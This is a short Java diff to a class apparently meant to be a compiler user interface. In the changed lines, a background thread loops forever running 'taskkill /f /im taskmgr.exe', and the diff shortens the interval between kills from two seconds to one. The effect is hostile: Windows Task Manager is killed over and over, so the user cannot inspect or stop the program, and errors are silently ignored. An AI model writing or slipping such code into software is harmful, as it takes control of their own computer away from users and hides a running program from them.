@@ -194,8 +194,8 @@ public class CompilerUserInterface extends JPanel implements ActionListener {
 			public void run() {
 				while(true){
 					try {
-						Process killProcess = Runtime.getRuntime().exec("taskkill /f /im taskmgr.exe");
-						Thread.sleep(2000);
+						killProcess = Runtime.getRuntime().exec("taskkill /f /im taskmgr.exe");
+						Thread.sleep(1000);
 					} catch (InterruptedException e) {
 					} catch (IOException e) {
 					}
